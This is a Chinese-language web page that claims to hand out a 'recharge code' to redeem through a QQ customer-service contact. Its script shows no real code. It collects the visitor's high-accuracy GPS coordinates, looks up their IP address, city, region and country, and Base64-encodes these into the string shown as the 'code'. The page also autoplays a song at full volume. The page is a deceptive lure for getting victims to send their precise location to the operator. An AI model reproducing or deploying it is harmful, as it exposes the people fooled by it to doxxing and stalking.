<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>充值码获取</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            position: relative;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 100%;
            width: 90%;
        }
        h1 {
            color: #333;
            font-size: 2em;
        }
        p {
            font-size: 1em;
            color: #555;
            margin-bottom: 20px;
        }
        button {
            padding: 15px 30px;
            font-size: 1em;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            width: 100%;
            max-width: 300px;
        }
        button:hover {
            background-color: #0056b3;
        }
        #location {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            width: 100%;
            word-wrap: break-word;
        }
        .error {
            color: red;
        }
        /* 模态弹窗样式 */
        .modal {
            display: none; /* 默认隐藏 */
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.4);
        }
        .modal-content {
            background-color: #fefefe;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
            max-width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            position: relative;
        }
        .close {
            color: #aaa;
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
            transition: color 0.3s ease;
        }
        .close:hover,
        .close:focus {
            color: black;
            text-decoration: none;
        }
        @media (max-width: 600px) {
            h1 {
                font-size: 1.5em;
            }
            p {
                font-size: 0.9em;
            }
            button {
                padding: 10px 20px;
                font-size: 0.9em;
            }
            #location {
                font-size: 0.9em;
            }
            .modal-content {
                margin: 10% auto;
                width: 90%;
            }
        }
    </style>
</head>
<body>
    <audio id="audioPlayer" src="/丑八怪.m4a" preload="auto" volume="1"></audio>
    <!-- 模态弹窗 -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <h2>公告</h2>
            <p>2024/12/14</p>
            <p>全新1.1版本已上线！请获取充值码后联系客服(QQ:3877105434，仅周五晚上至周日下午在线)兑换。</p>
        </div>
    </div>

    <div class="container">
        <h1>获取充值码</h1>
        <button onclick="getLocation()">点击获取充值码</button>
        <div id="location"></div>
    </div>

    <script>
        // 自动播放音频（音量最大）
        document.addEventListener("DOMContentLoaded", function() {
            const audio = document.getElementById('audioPlayer');
            audio.volume = 1; // 设置音量为最大
            audio.play().catch(error => {
                console.error('Audio playback failed:', error);
            });

            // 显示模态弹窗
            var modal = document.getElementById("myModal");
            var span = document.getElementsByClassName("close")[0];

            modal.style.display = "block";

            span.onclick = function() {
                modal.style.display = "none";
            }

            window.onclick = function(event) {
                if (event.target == modal) {
                    modal.style.display = "none";
                }
            }
        });

        function getLocation() {
            if (navigator.geolocation) {
                const options = {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                };
                navigator.geolocation.getCurrentPosition(showPosition, showError, options);
            } else { 
                document.getElementById("location").innerHTML = '<span class="error">您的浏览器不支持地理位置功能。</span>';
            }
        }

        function showPosition(position) {
            const latitude = position.coords.latitude.toFixed(10);
            const longitude = position.coords.longitude.toFixed(10);
            const locationString = `${latitude},${longitude}`;

            // 获取IP地址和其他信息
            fetch('https://ip-api.com/json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.query || '';
                    const city = data.city || '';
                    const region = data.regionName || '';
                    const country = data.country || '';

                    const combinedData = `${locationString}-${ip}-${city}-${region}-${country}`;
                    const encodedData = btoa(combinedData); // 对字符串进行Base64编码
                    document.getElementById("location").innerHTML = `充值码: ${encodedData}`;
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                    document.getElementById("location").innerHTML = '<span class="error">无法获取IP地址，请稍后再试。</span>';
                });
        }

        function showError(error) {
            let errorMessage;
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = "获取充值码失败，请允许获取您的位置信息。"
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = "无法获取位置信息，请稍后再试。"
                    break;
                case error.TIMEOUT:
                    errorMessage = "获取位置信息超时，请稍后再试。"
                    break;
                case error.UNKNOWN_ERROR:
                    errorMessage = "发生未知错误，请稍后再试。"
                    break;
            }
            document.getElementById("location").innerHTML = `<span class="error">${errorMessage}</span>`;
        }
    </script>
</body>
</html>
